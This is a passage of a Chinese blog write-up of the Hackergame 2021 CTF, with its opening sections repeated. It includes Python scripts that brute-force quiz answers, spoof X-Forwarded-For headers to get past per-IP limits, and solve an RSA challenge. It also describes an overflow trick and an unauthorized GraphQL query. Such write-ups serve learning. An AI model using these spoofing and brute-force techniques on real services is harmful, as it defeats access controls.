href=\"#进制十六——参上\" class=\"headerlink\" title=\"进制十六——参上\"></a>进制十六——参上</h2><blockquote>\n<p>为严防 flag 泄漏以及其他存在于未来所有可能的意外灾难，神通广大的 Z 同学不仅强制要求每一道题目都加上权限和资源的限制，还给所有参与 Hackergame 2021 命题的计算机施加了一层法术结界。任何试图从结界逃逸的 flag 都会被无情抹除。</p>\n<p>而一位明面上是计算机学院的新生，实则为物理学院暗部核心成员的 X 同学，在 Hackergame 2021 命题组已经潜伏多时。妄想趁比赛开始的午时，借阳火正旺之势，冲破 Z 同学的结界，以图片而非明文的形式，将 flag 悄悄传递出来。</p>\n<p>好在 Z 同学法力之深厚，不可管窥蠡测。在 flag 被传出去的前两天，就已预知此事并将图片中的 flag 无声消泯了。</p>\n<p>只是，这位 X 同学，虽然不会退出 Vim，但是似乎对打开十六进制编辑器颇有造诣……</p>\n</blockquote>\n<p><img src=\"https://hack.lug.ustc.edu.cn/media/629da242-b1b1-5f69-a623-1c13fcedf019/hex_editor.png\" alt=\"Hex\"></p>\n<p>同样是很简单的题目，随便找个十六进制编辑器照着抄下然后得出右边的 flag （手打真的累，还打错了一个字母）。</p>\n<h2 id=\"去吧！追寻自由的电波\"><a href=\"#去吧！追寻自由的电波\" class=\"headerlink\" title=\"去吧！追寻自由的电波\"></a>去吧！追寻自由的电波</h2><blockquote>\n<p>（前情提要） 为了打破 Z 同学布下的结界，X 同学偷偷搬出社团的业余无线电台试图向外界通讯。</p>\n<p>当然，如果只是这样还远远不够。遵依史称“老爹”的上古先贤的至理名言，必须要“用魔法打败魔法”。X 同学向上级申请到了科大西区同步辐射实验室设备的使用权限，以此打通次元空间，借助到另一个平行宇宙中 Z 同学的法力进行数据对冲，方才于乱中搏得一丝机会，将 flag 用无线电的形式发射了出去。</p>\n<p>考虑到信息的鲁棒性，X 同学使用了无线电中惯用的方法来区分字符串中读音相近的字母。即使如此，打破次元的强大能量扭曲了时空，使得最终接受到的录音的速度有所改变。</p>\n<p>为了保障同步辐射设备的持续运转，组织牺牲了大量的能源，甚至以东北部分地区无计划限电为代价，把这份沉甸甸的录音文件送到了你的手上。而刚刚起床没多久，试图抢签到题一血还失败了的你，可以不辜负同学们对你的殷切期望吗？</p>\n<p>注：flag 花括号内只包含小写字母。</p>\n</blockquote>\n<p>题目说了速度变了，显然是变快了，直接用经典音频隐写软件 Audacity 打开， <code>Ctrl</code> + <code>A</code> 全选，效果-改变速率，然后随手一拖把改变百分比拖到 <code>70</code> 就有非常标准清晰的单词，不看题目都能盲猜是首字母，后来查电报区分字符串中读音相近的字母的方法也确实对应，但是我还是不想自己听，打开翻译软件，嗯，语音识别不错，除了两个花括号我一开始没反应过来把也当成字母了QAQ。</p>\n<h2 id=\"猫咪问答-Pro-Max\"><a href=\"#猫咪问答-Pro-Max\" class=\"headerlink\" title=\"猫咪问答 Pro Max\"></a>猫咪问答 Pro Max</h2><blockquote>\n<p>我猛然一看，就猛然看到这个猫咪问答，我直呼我直呼，上次看到这么这么的发言还是上次，这问答属于是典型的典型了，我之前还没发现，当我发现的时候我已经发现了，这问答就像一个问答，问答的内容充满了内容，我不禁感慨了一句感慨：希望下次看到这么这么的猫咪问答是下次。</p>\n</blockquote>\n<p>题目的废话文学着实是让我涨了见识，这简直简直了，我以前从未想过有如此废话的废话文学，等我看见的时候已经看见了……第一问也是最难的一问，把百度必应谷歌翻烂了也没有，后来终于在一个专门存快照的国外网站上找到了那个已经消失的俱乐部的网页存档，第三问直接在中科大 Linux 用户协会官网找到，第五问也不难搜（虽然我没想到举报信可以发到这么奇怪的…呃不知怎么形容，目录？？去），第四问我看到论文直接望而生畏，搜索 data set 无果后果断爆破，合理猜测在 <code>100</code> 以下，但发现居然不行？？？万分怀疑的我试探性地把第二问改成 <code>3</code> （或许是我对近五年的理解有问题？），也不行，改成 <code>5</code> ，行了 <del>（这协会真不要 face ）</del>，脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests <span class=\"keyword\">as</span> r</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://202.38.93.111:10001/&#x27;</span></span><br><span class=\"line\">    payload = &#123;<span class=\"string\">&#x27;q1&#x27;</span>: <span class=\"number\">20150504</span>, <span class=\"string\">&#x27;q2&#x27;</span>: <span class=\"number\">5</span>,</span><br><span class=\"line\">               <span class=\"string\">&#x27;q3&#x27;</span>: <span class=\"string\">&#x27;Development Team of Library&#x27;</span>, <span class=\"string\">&#x27;q4&#x27;</span>: <span class=\"number\">0</span>, <span class=\"string\">&#x27;q5&#x27;</span>: <span class=\"string\">&#x27;/dev/null&#x27;</span>&#125;</span><br><span class=\"line\">    headers = &#123;<span class=\"string\">&#x27;Cookie&#x27;</span>: <span class=\"string\">&#x27;session=eyJ0b2tlbiI6IjQ2Ok1FWUNJUUNyY2xUYU1XcG9sUzZqZzM0Z2IyZnMyeEJBNGtMa01DYnpKV1dERGNKWUJnSWhBT3RQTzBXSnhLMnRmcytWcVRReWd5eHdKMFY2dEZ6bGlycXVNSURHbU9EaSJ9.YXYWYA.2MXfMT2si0FkY-Z9jOc7V4jenTU&#x27;</span>&#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(<span class=\"number\">100</span>)):</span><br><span class=\"line\">        payload[<span class=\"string\">&#x27;q4&#x27;</span>] = i</span><br><span class=\"line\">        _ = r.post(url=url, data=payload, headers=headers).text</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            rst = re.findall(</span><br><span class=\"line\">                <span class=\"string\">r&#x27;&lt;div class=&quot;alert alert-secondary&quot; role=&quot;alert&quot;&gt;((?:.|\\n)*?)&lt;/div&gt;&#x27;</span>, _)[<span class=\"number\">0</span>]</span><br><span class=\"line\">        <span class=\"keyword\">except</span> IndexError:</span><br><span class=\"line\">            s=re.findall(<span class=\"string\">r&#x27;(flag&#123;.*?&#125;)&#x27;</span>, _)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"built_in\">print</span> (<span class=\"string\">&#x27;\\n&#x27;</span>+s)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;q4答案是&#x27;</span>+<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"卖瓜\"><a href=\"#卖瓜\" class=\"headerlink\" title=\"卖瓜\"></a>卖瓜</h2><blockquote>\n<p>有一个人前来买瓜。</p>\n<p>HQ：哥们，这瓜多少钱一斤啊？</p>\n<p>你：两块钱一斤。</p>\n<p>HQ：What’s up！这瓜皮子是金子做的还是瓜粒子是金子做的？</p>\n<p>你：你瞧瞧现在哪有瓜啊？这都是大棚的瓜，只有 6 斤一个和 9 斤一个的，你嫌贵我还嫌贵呢。</p>\n<p>（HQ 心里默默一算）</p>\n<p>HQ：给我来 20 斤的瓜。</p>\n<p>你：行！</p>\n<p>HQ：行？这瓜能称出 20 斤吗？</p>\n<p>你：我开水果摊的，还不会称重？</p>\n<p>HQ：我问你这瓜能称出 20 斤吗？</p>\n<p>你：你是故意找茬，是不是？你要不要吧！</p>\n<p>HQ：你这瓜要是刚好 20 斤吗我肯定要啊。那它要是没有怎么办啊？</p>\n<p>你：要是不是 20 斤，我自己吃了它，满意了吧？</p>\n<p>（你开始选瓜称重）</p>\n</blockquote>\n<p>在看过上一年的题目后可以直接看出是溢出，但是输入的数字过大后出现了浮点数，于是我上网搜了数据类型，随便复制了一个数（ 2 的多少次方来着？？忘了）过来输入到 9 斤那，出现了一个大负数，然后我掏出大宝贝—— Windows 计算器除以 6 ，结果去掉小数后再输入到 6 斤那，此时称上有了 -2 斤，嗯，可行，再来一次， -4 了，直接再放 4 个 6 斤，逃过一劫，得到 flag 。</p>\n<h2 id=\"FLAG-助力大红包\"><a href=\"#FLAG-助力大红包\" class=\"headerlink\" title=\"FLAG 助力大红包\"></a>FLAG 助力大红包</h2><blockquote>\n<p>“听说没？【大砍刀】平台又双叒做活动啦！参与活动就送 0.5 个 flag 呢，攒满 1 个 flag 即可免费提取！”</p>\n<p>“还有这么好的事情？我也要参加！”</p>\n<p>“快点吧！我已经拿到 flag 了呢！再不参加 flag 就要发完了呢。”</p>\n<p>“那怎么才能参加呢？”</p>\n<p>“这还不简单！点击下面的链接就行”</p>\n</blockquote>\n<p>这应该是让我学到最多东西的一题，看到题目的说明我第一反应就是通过 http 请求头伪造 IP 地址，搜到可以通过 X-Forwarded-For 实现，但中途我试图通过审查元素修改表单数据实现，结果提示前后端地址不匹配（后来才发现我没读题），于是找了个伪造 IP 地址的插件，这次是后端改了前端还是原来的，两个结合，发现可以成功砍到，手改几次后发现速度来不及，被迫找到 Python 的实现，一开始没加时间限制发现有令牌桶防着，就加了个停顿，脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://202.38.93.111:10888/invite/77632ca2-c165-46ee-a8d2-ba89094b0401&#x27;</span></span><br><span class=\"line\">ua = <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(<span class=\"number\">256</span>)):</span><br><span class=\"line\">    s = (<span class=\"built_in\">str</span>(i)+<span class=\"string\">&#x27;.104.67.89&#x27;</span>)</span><br><span class=\"line\">    params = &#123;<span class=\"string\">&quot;ip&quot;</span>: s,&#125;</span><br><span class=\"line\">    request = requests.post(url, data=params, headers=&#123;<span class=\"string\">&#x27;User-agent&#x27;</span>: ua, <span class=\"string\">&#x27;X-Forwarded-For&#x27;</span>:s&#125;)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">0.9</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(request.text)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Amnesia第一问\"><a href=\"#Amnesia第一问\" class=\"headerlink\" title=\"Amnesia第一问\"></a>Amnesia第一问</h2><blockquote>\n<p>你的程序只需要输出字符串 Hello, world!（结尾有无换行均可）并正常结束。</p>\n<p>编译指令：gcc -O file.c -m32</p>\n<p>运行指令：./a.out</p>\n<p>编译器版本：Docker 镜像 ustclug/debian:10 中 apt update &amp;&amp; apt -y upgrade &amp;&amp; apt install -y gcc=4:8.3.0-1 gcc-multilib=4:8.3.0-1 的版本</p>\n<p>轻度失忆</p>\n<p>编译后 ELF 文件的 .data 和 .rodata 段会被清零。</p>\n<p>连接题目：nc 202.38.93.111 10051 或网页终端</p>\n<p>判题脚本：下载</p>\n</blockquote>\n<p>第一问不难，发现直接 <code>printf(&quot;Hello,world!&quot;)</code> 失败后改成用 <code>printf(&quot;%c&quot;,&lt;每个字符的ASCII码&gt;)</code>，但提交后错误，仔细检查发现多了几个奇怪的不可显示字符，应该是直接从网页复制的问题，删掉后提交得到flag，比赛结束后才知道还可以 putchar 呃呃</p>\n<h2 id=\"图之上的信息\"><a href=\"#图之上的信息\" class=\"headerlink\" title=\"图之上的信息\"></a>图之上的信息</h2><blockquote>\n<p>小 T 听说 GraphQL 是一种特别的 API 设计模式，也是 RESTful API 的有力竞争者，所以他写了个小网站来实验这项技术。</p>\n<p>你能通过这个全新的接口，获取到没有公开出来的管理员的邮箱地址吗？</p>\n</blockquote>\n<p>第一反应是 SQL 注入，但零基础的我忙活了半天才知道 <code>/graphql</code> 是端点，查看 http 请求看到负载语句 <code>&#123;query: &quot;&#123; notes(userId: 2) &#123; id↵contents &#125;&#125;&quot;&#125;</code> 猜测 admin 的 id 是 1 ，于是疯狂查询 1 的 contents ，结果回显都是我没有权限，后来搜到了 Graphql 的 IDE ，找到了存储邮箱的地方，查询得到 flag 。</p>\n<h2 id=\"Easy-RSA\"><a href=\"#Easy-RSA\" class=\"headerlink\" title=\"Easy RSA\"></a>Easy RSA</h2><blockquote>\n<p>自从 Hackergame 2018 公然揭露了大整数可以被神童口算分解的事实，RSA 在 hackergame 中已经只能处于低分值的地位了。如果不在其名称前面加上 Easy 这个单词，似乎就会显得完全对不起其他题目。</p>\n<p>更何况，在本题的附件中，你还获得了构造 p 和 q 的方式。数理基础扎实的你应该可以轻松解决这些问题吧。</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"><span class=\"keyword\">import</span> sympy</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_p</span>():</span><br><span class=\"line\">    x = <span class=\"number\">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class=\"line\">    y = <span class=\"number\">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class=\"line\">    value_p = sympy.nextprime((math.factorial(y)) % x)  <span class=\"comment\"># Hint：这里直接计算会溢出，请你仔细观察 x 和 y 的特征</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> value_p</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_q</span>():</span><br><span class=\"line\">    value = [getPrime(<span class=\"number\">256</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">10</span>):</span><br><span class=\"line\">        value.append(sympy.nextprime(value[i - <span class=\"number\">1</span>]))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;value[-1] = &quot;</span>, value[-<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"comment\"># value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967</span></span><br><span class=\"line\">    n = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">        n = n * value[i]</span><br><span class=\"line\">    q = getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\">    value_q = <span class=\"built_in\">pow</span>(q, e, n)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;value_q = &quot;</span>, value_q)</span><br><span class=\"line\">    <span class=\"comment\"># value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> sympy.nextprime(q)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># this destroyes the rsa cryptosystem</span></span><br><span class=\"line\">p = get_p()</span><br><span class=\"line\">q = get_q()</span><br><span class=\"line\"></span><br><span class=\"line\">m = <span class=\"built_in\">int</span>.from_bytes(<span class=\"built_in\">open</span>(<span class=\"string\">&quot;flag.txt&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>).read(), <span class=\"string\">&quot;big&quot;</span>)</span><br><span class=\"line\">c = <span class=\"built_in\">pow</span>(m, e, p * q)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;c = &quot;</span>, c)</span><br><span class=\"line\"><span class=\"comment\"># c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478</span></span><br></pre></td></tr></table></figure>\n\n<p>数理杀我的一题， acm 的题中有过类似的，威尔逊定理求出 $p$ ， $q$ 的话不难求，很好，现在是经典 RSA 了，什么，你问我到底怎么求的 p？<del>哦？我还等你讲给我听呢（装傻，阿巴阿巴）。</del><br>首先科普一下模逆元的概念，比如 $x\\equiv 3^{-1}\\mod 5$ ，这个并非是 $x=\\frac{1}{3}$ 的意思，而是 $x$ 满足 $3x\\equiv 1 \\mod 5$ ，这时口算得出 $x=2$ ，因为 $6\\equiv 1 \\mod5$ 嘛。<br>然后是威尔逊定理，即 $(p-1)!\\equiv-1 \\pmod p$ 是 $p$ 为素数的充要条件。<br>题目给出大数 $x$ 和比 $x$ 小一点的 $y$ ，要我们求 $y! \\mod x$ ，检验发现 $x$ 是一个素数，那么就有 $(x-1)!\\equiv-1 \\pmod x$ 。<br>继而由 $(x-1)!=y(y+1)(y+2)\\cdots(x-1)$ ，不难推知<br>$$<br>y!\\equiv -1(x-1)^{-1}(x-2)^{-1}\\cdots (y+1)^{-1} \\mod\\ x<br>$$<br>python 计算逆元有两种方法，一种是 <code>pow(a, -1, b)</code>，另一种是用 gmpy2 库，即 <code>gmpy2.invert(a,b)</code></p>\n<p>完整 exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sympy</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> invert</span><br><span class=\"line\"></span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_p</span>():</span><br><span class=\"line\">    x = <span class=\"number\">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class=\"line\">    y = <span class=\"number\">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class=\"line\">    facymodx = -<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(y+<span class=\"number\">1</span>,x):</span><br><span class=\"line\">        facymodx = facymodx*invert(i,x)%x</span><br><span class=\"line\">    value_p = sympy.nextprime(facymodx)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> value_p</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_q</span>():</span><br><span class=\"line\">    value_inverse = [</span><br><span class=\"line\">        <span class=\"number\">80096058210213458444437404275177554701604739094679033012396452382975889905967</span>]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">10</span>):</span><br><span class=\"line\">        value_inverse.append(sympy.prevprime(value_inverse[i-<span class=\"number\">1</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\">    n = <span class=\"number\">1</span></span><br><span class=\"line\">    phi = <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">        n = n * value_inverse[i]</span><br><span class=\"line\">        phi = phi * (value_inverse[i]-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    value_q = <span class=\"number\">5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819</span></span><br><span class=\"line\">    d = invert(e, phi)</span><br><span class=\"line\">    q = <span class=\"built_in\">pow</span>(value_q, d, n)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sympy.nextprime(q)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">c = <span class=\"number\">110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    p = get_p()</span><br><span class=\"line\">    q = get_q()</span><br><span class=\"line\">    <span class=\"comment\"># print(len(str(q)))</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(p)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(q)</span><br><span class=\"line\">    n = p * q</span><br><span class=\"line\">    phi = (p-<span class=\"number\">1</span>) * (q-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    d = invert(e, phi)</span><br><span class=\"line\"></span><br><span class=\"line\">    m = <span class=\"built_in\">pow</span>(c, d, n)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>\n","excerpt":"<p>第一次打CTF比赛</p>","more":"<h2 id=\"Summary\"><a href=\"#Summary\" class=\"headerlink\" title=\"Summary\"></a>Summary</h2><p>作为新手，第一次参加 CTF ，题目比 MSClub 的招新 puzzle 难得多，但是也好玩得多，前两天有幸短暂地在总榜停留过（或者只是第一天？忘了），最终组内排名第四（因为校内的大佬不在）（ GZTime tql ，凌晨肝神冲到总榜第四orz，此处附上 <a href=\"https://blog.gztime.cc/posts/2021/9f04efbd/\">wp 传送门</a>）。比赛的题目出得都非常得有趣 <del>（除了透明的文件）</del>，对新手来说体验确实不错，也确实是名副其实的 pythongame（零基础强行入门），做到灯那题的时候我面对线性非齐次方程组的无穷多解毫无头绪，这彻底燃起了我学线代的激情（嗯，有意思），最后我交的第一个错误的 flag 上了花絮也有小小的惊喜（没错我确实是有备而来 hiahiahia）。总体体验良好，明年再来。下面是我做出的几题的 wp，内容较水，可酌情移步至<a href=\"https://mcfx.us/posts/2021-10-30-hackergame-2021-writeup/\">神（mcfx）的 wp</a>。</p>\n<hr>\n<h2 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h2><blockquote>\n<p>为了能让大家顺利签到，命题组把每一秒的 flag 都记录下来制成了日记本的一页。你只需要打开日记，翻到 Hackergame 2021 比赛进行期间的任何一页就能得到 flag！</p>\n</blockquote>\n<p>很简单的 web 题，注意到网址栏的后面的<code>?page=&lt;当面的数字&gt;</code>，直接修改，疯狂加 0，然后二分法试探，最终在 <code>?page=1635000000</code> 的时候到达当前时间，出 flag (后来才知道这是时间戳)。</p>\n<h2 id=\"进制十六——参上\"><a href=\"#进制十六——参上\" class=\"headerlink\" title=\"进制十六——参上\"></a>进制十六——参上</h2><blockquote>\n<p>为严防 flag 泄漏以及其他存在于未来所有可能的意外灾难，神通广大的 Z 同学不仅强制要求每一道题目都加上权限和资源的限制，还给所有参与 Hackergame 2021 命题的计算机施加了一层法术结界。任何试图从结界逃逸的 flag 都会被无情抹除。</p>\n<p>而一位明面上是计算机学院的新生，实则为物理学院暗部核心成员的 X 同学，在 Hackergame 2021 命题组已经潜伏多时。妄想趁比赛开始的午时，借阳火正旺之势，冲破 Z 同学的结界，以图片而非明文的形式，将 flag 悄悄传递出来。</p>\n<p>好在 Z 同学法力之深厚，不可管窥蠡测。在 flag 被传出去的前两天，就已预知此事并将图片中的 flag 无声消泯了。</p>\n<p>只是，这位 X 同学，虽然不会退出 Vim，但是似乎对打开十六进制编辑器颇有造诣……</p>\n</blockquote>\n<p><img src=\"https://hack.lug.ustc.edu.cn/media/629da242-b1b1-5f69-a623-1c13fcedf019/hex_editor.png\" alt=\"Hex\"></p>\n<p>同样是很简单的题目，随便找个十六进制编辑器照着抄下然后得出右边的 flag （手打真的累，还打错了一个字母）。</p>\n<h2 id=\"去吧！追寻自由的电波\"><a href=\"#去吧！追寻自由的电波\" class=\"headerlink\" title=\"去吧！追寻自由的电波\"></a>去吧！追寻自由的电波</h2><blockquote>\n<p>（前情提要） 为了打破 Z 同学布下的结界，X 同学偷偷搬出社团的业余无线电台试图向外界通讯。</p>\n<p>当然，如果只是这样还远远不够。遵依史称“老爹”的上古先贤的至理名言，必须要“用魔法打败魔法”。X 同学向上级申请到了科大西区同步辐射实验室设备的使用权限，以此打通次元空间，借助到另一个平行宇宙中 Z 同学的法力进行数据对冲，方才于乱中搏得一丝机会，将 flag 用无线电的形式发射了出去。</p>\n<p>考虑到信息的鲁棒性，X 